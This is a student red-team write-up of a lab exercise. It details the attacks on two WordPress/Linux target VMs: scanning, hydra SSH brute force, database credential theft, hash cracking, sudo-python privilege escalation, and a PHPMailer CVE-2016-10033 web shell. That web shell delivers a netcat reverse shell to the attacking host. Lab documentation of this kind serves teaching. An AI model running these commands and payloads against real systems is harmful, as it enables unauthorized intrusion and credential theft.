# Red Team: Summary of Operations
## Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

## Network Topology

![Image](/24-Final-Project/FinalProject-NetworkDiagram_io_V1.jpg)

Notes:

- For the details of, and methodology to retrieve the information in this topology, refer to the [Readme.md](/24-Final-Project/Readme.md)
- The topology is also provided in [.jpg](/24-Final-Project/FinalProject-NetworkDiagram_io_V1.jpg) and [.pdf](/24-Final-Project/FinalProject-NetworkDiagram_io_V1.drawio.pdf) files for easy reference while reading the analyses documents.

## Exposed Services

---

### Attacking (Kali Machine) Details

- Kali IP Address: 192.168.1.90
![Image](/24-Final-Project/ImagesProject/01.jpg)

- Kali OS Version
![Image](/24-Final-Project/ImagesProject/13.jpg)

---

### Network Scan

```bash
netdiscover -r 192.168.1.0/16
```

- Netdiscover is a simple ARP scanner which can be used to scan for live hosts in a network. It can scan for multiple subnets also. It simply produces the output in a live display(ncurse).
- -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
- 192.168.1.0/16 range to scan

![Image](/24-Final-Project/ImagesProject/03.jpg)

![Image](/24-Final-Project/ImagesProject/02.jpg)

---

### Target 1 Vulnerabilities

|Item|Description|
|---|---|
|Name of VM|Target 1|
|Operating System|Linux|
|IP Address|192.168.1.110|
|Purpose|Blue Team Defenders|

Once the target is identified, 192.168.1.110, perform a nmap scan to find the services (nmap -sV | full version scan)

```bash
nmap -sV 192.168.1.110
```

![Image](/24-Final-Project/ImagesProject/04.jpg)

The nmap scan reveal the following services on `Target 1`:

- **Target 1**

|Port|State|Protocol|Service|Version|
|---|---|---|---|---|
|Port 22/tcp| open| ssh| (service) OpenSSH| 6.7p1 Debian 5+deb8u4|
|Port 80/tcp| open| http| (service) Apache| httpd 2.4.10 ((Debian))|
|Port 111/tcp| open| rpcbind| (service) RPC| 2-4 (RPC #100000)|
|Port 139/tcp| open| netbios-ssn| (services) Samba| smbd 3.X - 4.X|
|Port 445/tcp| open| netbios-ssn| (services) Samba| smbd 3.X - 4.X|

Based on the services, the following vulnerabilities are potentially present on `Target 1`:

- **Target 1**

  - [CVE-2021-28041 open SSH](https://nvd.nist.gov/vuln/detail/CVE-2021-28041)  
  - [CVE-2017-15710 Apache https 2.4.10](https://nvd.nist.gov/vuln/detail/CVE-2017-15710)
  - [CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS](https://nvd.nist.gov/vuln/detail/CVE-2017-8779)  
  - [CVE-2017-7494 Samba NetBIOS](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)  

The following vulnerabilities were exploited on **`Target 1`**:  

|Vulnerability|Exploit Used|Result|
|---|---|---|
|Network Mapping and User Enumeration (nmap)|Nmap was used to discover open ports.|Able to discover open ports and tailor their attacks accordingly.|
|Network Mapping and User Enumeration (WordPress site)|WPScan is a black box WordPress vulnerability scanner. |WPScan: Scan a target WordPress URL and enumerate any plugins that are installed|
|Weak User Password|A user had a weak password and the attackers were able to discover it by guessing.|Able to correctly guess a user's password and SSH into the web server.  
|Unsalted User Password Hash (WordPress database)|Wpscan was utilized by attackers in order to gain username information.  |The username info was used by the attackers to help gain access to the web server.  
|MySQL Database Access|The attackers were able to discover a file containing login information for the MySQL database.|Able to use the login information to gain access to the MySQL database.|
|MySQL Data Exfiltration|By browsing through the various tables in the MySQL database the attackers were able to discover password hashes of all the users.|The attackers were able to exfiltrate the password hashes and crack them with John the Ripper.|
|Misconfiguration of User Privileges/Privilege Escalation|The attackers noticed that Steven had sudo privileges for python|Able to utilize Steven’s python privileges in order to escalate to root.|

---

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

- **`Target 1`**

---

  - `flag1.txt`: ![Image](/24-Final-Project/ImagesProject/25.jpg)

    - **Exploit Used**
      - WPScan: Scan a target WordPress URL and enumerate any plugins that are installed (WordPress site)
      - Identified user Michael
      - SSH into `Target 1` and obtain Shell, Possible because the weak password is the same as the username.
      - Navigate directory structure to classified information because directory authorisation is not appropriately set
      - View classified information in file where the authorition is not appropriately set

`wpscan -url http://192.168.1.110/wordpress -eu`

```bash
wpscan [options]

    --url URL                                 The URL of the blog to scan
                                              Allowed Protocols: http, https
                                              Default Protocol if none provided: http
-e, --enumerate [OPTS]                        Enumeration Process
                                              u    User IDs range. e.g: u1-5
                                                  Range separator to use: '-'
                                                  Value if no argument supplied: 1-10
```

![Image](/24-Final-Project/ImagesProject/05.jpg)

**Users** identified:

![Image](/24-Final-Project/ImagesProject/06.jpg)

We used [HYDRA](https://www.kali.org/tools/hydra/) to find the password:

![Image](/24-Final-Project/ImagesProject/36x1.jpg)

Using `hydra` attempt to login as user `-l michael` using a password list `-P /usr/share/wordlists/rockyou.txt` with 4 threads `-t 4` on the SSH server `ssh://192.168.1.110`

**SSH** into `Target 1` and obtain Shell using user `Michael`. Possible because the weak password is the same as the username.

![Image](/24-Final-Project/ImagesProject/16.jpg)

Navigate directory structure to classified information because directory authorisation is not appropriately set, and search for the flag in HTML directory and sub directories

```bash
grep — search a file for a pattern
       -E    Match using extended regular expressions.
       -R    --dereference-recursive
                  Read  all  files under each directory, recursively.  Follow
                  all symbolic links, unlike -r.
flag  expression to search for
html  location (and subdirectories)
```

![Image](/24-Final-Project/ImagesProject/26.jpg)

View classified information in file where the authorition is not appropriately set

![Image](/24-Final-Project/ImagesProject/24.jpg)

We can also navigate to the web site, then look at the source of the file listed here and find the flag like that

![Image](/24-Final-Project/ImagesProject/07.jpg)

![Image](/24-Final-Project/ImagesProject/18.jpg)

---

  - `flag2.txt`: ![Image](/24-Final-Project/ImagesProject/27.jpg)
    - **Exploit Used**
      - WPScan: Scan a target WordPress URL and enumerate any plugins that are installed (WordPress site)
      - Identified user Michael
      - SSH into `Target 1` and obtain Shell, Possible because the weak password is the same as the username.
      - Navigate directory structure to classified information because directory authorisation is not appropriately set
      - View classified information in file where the authorition is not appropriately set

**SSH** into `Target 1` and obtain Shell using user `Michael`. Possible because the weak password is the same as the username.

![Image](/24-Final-Project/ImagesProject/16.jpg)

Navigate directory structure to classified information because directory authorisation is not appropriately set, and view the contents of the file where the authorisation is not appropriately set.

![Image](/24-Final-Project/ImagesProject/17.jpg)

---

  - `flag3.txt`: ![Image](/24-Final-Project/ImagesProject/32.jpg)
    - **Exploit Used**
      - WPScan: Scan a target WordPress URL and enumerate any plugins that are installed (WordPress site)
      - Identified user Michael
      - SSH into `Target 1` and obtain Shell, Possible because the weak password is the same as the username.
      - Navigate directory structure to classified information because directory authorisation is not appropriately set
      - View classified information in file where the authorition is not appropriately set
      - Look for a `wp-config.php` file in `/var/www/html`
      - Username & Password stored in clear text
      - Accessed the SQL DB & traversed the DB, tables, and data as root

After SSH into the system, using the information and methods for flags 1 & 2, the exploit moved to finding the WordPress configuration file.

![Image](/24-Final-Project/ImagesProject/20.jpg)

The contents of the directory and the configuration file were not protected with appropriate authorisation levels or obfuscated in any way.

![Image](/24-Final-Project/ImagesProject/21.jpg)

![Image](/24-Final-Project/ImagesProject/22.jpg)

20% into the configuration file were the username and password in clear text.

![Image](/24-Final-Project/ImagesProject/23.jpg)

The following information is now available to continue the exploit:

|Item|Description|
|---|---|
|DB_NAME|wordpress|
|DB_USER|root|
|DB_PASSWORD|R@v3nSecurity|
|Command|mysql -u root -p wordpress|

![Image](/24-Final-Project/ImagesProject/28.jpg)

After investigating the SQL Database extensively, the "shortest" path to the next flag is presented next:

`show databases;`

![Image](/24-Final-Project/ImagesProject/29.jpg)

Select the wordpress database
`use wordpress;`

`show tables;`

![Image](/24-Final-Project/ImagesProject/30.jpg)

`select * from wp_posts;`

![Image](/24-Final-Project/ImagesProject/31.jpg)

Which reveals flag 3 & flag 4

![Image](/24-Final-Project/ImagesProject/32.jpg)

![Image](/24-Final-Project/ImagesProject/33.jpg)

---

Flag 4 is in two locations. The following steps shows the alternative method to capture flag 4.

  - `flag4.txt`: ![Image](/24-Final-Project/ImagesProject/33.jpg)
    - **Exploit Used**
      - WPScan: Scan a target WordPress URL and enumerate any plugins that are installed (WordPress site).
      - Identified user Michael.
      - SSH into `Target 1` and obtain Shell, Possible because the weak password is the same as the username.
      - Navigate directory structure to classified information because directory authorisation is not appropriately set.
      - View classified information in file where the authorition is not appropriately set.
      - Look for a `wp-config.php` file in `/var/www/html`.
      - Username & Password stored in clear text.
      - Accessed the SQL DB & traversed the DB, tables, and data as root.
      - Hashes stored in table not protected with authorisation, with the simple hashes being easy to crack | use `john` to crack the password.
      - SSH into target system using the new credentials.
      - Create an Interactive Terminal (spawned via Python).
      - Navigate the target system unopposed and extract the sensitive information.

After SSH into the system, using the information and methods for flags 1 & 2, the exploit moved to finding the WordPress configuratin file. Then, accessed the SQL DB & traversed the DB, tables, and data as root before moving on with the exploit.

`select * from wp_users;`
Reveals the usernames and their password hashes.

![Image](/24-Final-Project/ImagesProject/34.jpg)

We transfer the hashes to a text file and commence a password crack using the tool [JOHN THE RIPPER](https://www.kali.org/tools/john/)
The format of the hash file is `username:hash`

![Image](/24-Final-Project/ImagesProject/38.jpg)

Command: `john [hash file]`

![Image](/24-Final-Project/ImagesProject/39.jpg)

Command: `john --show [hash file]`

![Image](/24-Final-Project/ImagesProject/40.jpg)

`sudo -l` : List the commads you have the right to use with `sudo`

![Image](/24-Final-Project/ImagesProject/41.jpg)

We note Python can be run, and the exploit is Interactive Terminal Spawned via Python (although there is an `elastic` rule available for this exploit, we are not checking for it.):
https://www.elastic.co/guide/en/security/current/interactive-terminal-spawned-via-python.html
https://attack.mitre.org/tactics/TA0002/
https://attack.mitre.org/techniques/T1059/

[Methods to spawn TTY Shell](https://netsec.ws/?p=337)

Command: `python -c 'import pty; pty.spawn("/bin/sh")'`

This method, immediately escalated us to `root` privileges!

![Image](/24-Final-Project/ImagesProject/42.jpg)

Locate the sensitive information:

- `cd /root`
- `ls`
- `cat flag4.txt`

![Image](/24-Final-Project/ImagesProject/43.jpg)

---

---

## TARGET 2

**Target 2:** A `bonus` target machine.

The IP address was identified earlier, during the attack on **Target 1**.

- **Target 2** IP Address: `192.168.1.115`

An nmap service scan reveals ports and services in use
`nmap -sV 192.168.1.115`

|Service Information|Detail|||
|---|---|---|---|
|Command|nmap -sV 192.168.1.115|||
|PORT    |STATE |SERVICE     |VERSION|
|22/tcp  |open  |ssh         |OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)|
|80/tcp  |open  |http        |Apache httpd 2.4.10 ((Debian))|
|111/tcp |open  |rpcbind     |2-4 (RPC #100000)|
|139/tcp |open  |netbios-ssn |Samba smbd 3.X - 4.X (workgroup: WORKGROUP)|
|445/tcp |open  |netbios-ssn |Samba smbd 3.X - 4.X (workgroup: WORKGROUP)|
|MAC Address: |00:15:5D:00:04:11 |(Microsoft)||
|Service Info: |Host: TARGET2; |OS: Linux; |CPE: cpe:/o:linux:linux_kernel|

![](/24-Final-Project/ImagesProject/0-12.jpg)

### Critical Vulnerabilities

The following vulnerabilities were identified on **`Target 2`**:  

- [CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer)](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)  
  - CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer 5.2.16)  
    - Get access to the web services and search for a lot of confidential information.  
      - Exploiting PHPMail with back connection (reverse shell) from the target  
- [CVE-2021-28041 open SSH](https://nvd.nist.gov/vuln/detail/CVE-2021-28041)  
- [CVE-2017-15710 Apache https 2.4.10](https://nvd.nist.gov/vuln/detail/CVE-2017-15710)  
- [CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS](https://nvd.nist.gov/vuln/detail/CVE-2017-8779)  
- [CVE-2017-7494 Samba NetBIOS](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)  

- Network Mapping and User Enumeration (WordPress site)  
  - `nmap` was used to discover open ports.  
    - Able to discover open ports and tailor their attacks accordingly.
  - `nikto` and `gobuster` were used to enumerate the website

---

### Flag 1 

- Flag1.txt: `flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}`
- Exploit
  - Network Mapping and User Enumeration (WordPress site)  
    - `nmap` was used to discover open ports.  
      - Able to discover open ports and tailor their attacks accordingly.
    - `nikto` and `gobuster` were used to enumerate the website
- Command: `nikto -C all -h 192.168.1.115`
- Command: `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115`

Focusing the attack on the Apache Server

Enumerate the Apache Web Server with `nikto`
Command: `nikto -C all -h 192.168.1.115`

![](/24-Final-Project/ImagesProject/1-01.jpg)

The website at this URL is:

![](/24-Final-Project/ImagesProject/1-02.jpg)

By following links, we see this is a wordpress site:

![](/24-Final-Project/ImagesProject/1-03.jpg)

More in-depth enumeration with Gobuster.
- Command: `sudo apt-get update`
- Command: `sudo apt-get install gobuster`

![](/24-Final-Project/ImagesProject/1-05.jpg)

- Command: `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115`

![](/24-Final-Project/ImagesProject/1-06.jpg)

Following the links which were enumerated by both `nikto` and `gobuster`, we note the `PATH` file in the following directory has as different timestamp.

![](/24-Final-Project/ImagesProject/1-07.jpg)

![](/24-Final-Project/ImagesProject/1-04.jpg)

---

## Flag 2

- flag2.txt: `flag2{6a8ed560f0b5358ecf844108048eb337}`  
- Exploit Used:  
  - Used Searchsploit to find vulnerability associated with PHPMailer 5.2.16, exploited with bash script to open backdoor on target, and opened reverse shell on target with Ncat listener. 
  - Used Searchsploit to find any known vulnerabilities associated with PHPMailer.
- Commands:
  - **Command:** `searchsploit phpmailer`
  - **Command:** `nc -lnvp 4444`  
  - **Command:** `nc 192.168.1.90 4444 -e /bin/bash`  
  - **URL:** `192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
  - **Command:** `python -c ‘import pty;pty.spawn(“/bin/bash”)’`

The `VERSION` file shows the version of PHPMailer;

![](/24-Final-Project/ImagesProject/1-08.jpg)

**Command:** `searchsploit phpmailer`

![](/24-Final-Project/ImagesProject/1-09.jpg)

**Command:** `searchsploit -x /usr/share/exploitdb/exploits/php/webapps/40970.php`

![](/24-Final-Project/ImagesProject/1-10.jpg)

Confirming the link between PHPMailer 5.2.16 and CVE-2016-10033

- [CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer)](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)  
  - CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer 5.2.16)  
    - Get access to the web services and search for a lot of confidential information.  
      - Exploiting PHPMail with back connection (reverse shell) from the target  

![](/24-Final-Project/ImagesProject/1-11.jpg)

Use the `exploit.sh` file, and add the IP: `192.168.1.115` for Target

![](/24-Final-Project/ImagesProject/1-12.jpg)

This script creates a backdoor which `ncat` can exploit: `/var/www/html/backdoor/php`

**Command:** `bash zexploit.sh`

![](/24-Final-Project/ImagesProject/1-13.jpg)

We now have a method to execute commands on the target, in the form of `192.168.1.115/backdoor.php?cmd=<CMD>`

To show the contents of the `passwd` file: 
**Command:** `192.168.1.115/backdoor.php?cmd=cat%20/etc/passwd'

![](/24-Final-Project/ImagesProject/1-14.jpg)

In order to activate the `ncat` session, we want to execute the command `nc 192.168.1.90 4444 -e /bin/bash` after we set up the listener in Kali. 

In order to set up the listener, we use the following command:

**Command:** `nc -lnvp 4444`
- `ncat` - Concatenate and redirect sockets
- `-l, --listen`               Bind and listen for incoming connections
- `-n, --nodns`                Do not resolve hostnames via DNS
- `-v, --verbose`              Set verbosity level (can be used several times)
- `-p, --source-port port`     Specify source port to use (**4444 in this case**)

![](/24-Final-Project/ImagesProject/1-15.jpg)

Deploying the payload will take the form of the following URL:

**Command:** `192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`

![](/24-Final-Project/ImagesProject/1-16.jpg)

Which succesfully establishes a connection:

![](/24-Final-Project/ImagesProject/1-17.jpg)

Running the following command will result in an Interactive User Shell opened on the Target.

**Command:** `python -c ‘import pty;pty.spawn(“/bin/bash”)’`

![](/24-Final-Project/ImagesProject/1-18.jpg)

Traversing the directories, we find flag 2, and can fiew it's contents:

![](/24-Final-Project/ImagesProject/1-19.jpg)

---

## Flag 3

- flag3.png: `flag3{a0f568aa9de277887f37730d71520d9b}`  
- Exploit Used:  
  - Used shell access on target to search WordPress uploads directory for `Flag 3`, discovered path location, and navigated to web browser to view `flag3.png`.  
- Commands:
  - **Command:** `find /var/www -type f -iname 'flag*'`  
  - **Path:** `/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png`  
  - **URL:** 192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png

Used the find command to find flags in the WordPress uploads directory.  
**Command:** `find /var/www -type f -iname 'flag*'`
- `find` find files or directories in location specified
- `-type f` specify file types to be found
- `-iname` ignore case of filename `flag*` (* = wildcard)

![](/24-Final-Project/ImagesProject/1-20.jpg)

- Discovered `Flag 3` location path is `/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png`  
- In web browser navigated to `192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`  

![](/24-Final-Project/ImagesProject/1-21.jpg)

---

## Flag 4

- flag4.txt: `flag4{df2bc5e951d91581467bb9a2a8ff4425}` 
- Exploits:
  - All previous exploits
  - Weak passwords that can be guessed
  - Lack of authorisation preventing access to directories and confidential information
- Commands:
  - `su root` switch to root user
  - Manual bruteforce password `toor`
  - `cd root` traverse directories
  - `ls -al` list files in directory
  - `cat flag4.txt` displays confidential inforamtion

![](/24-Final-Project/ImagesProject/1-22.jpg)

![](/24-Final-Project/ImagesProject/1-23.jpg)
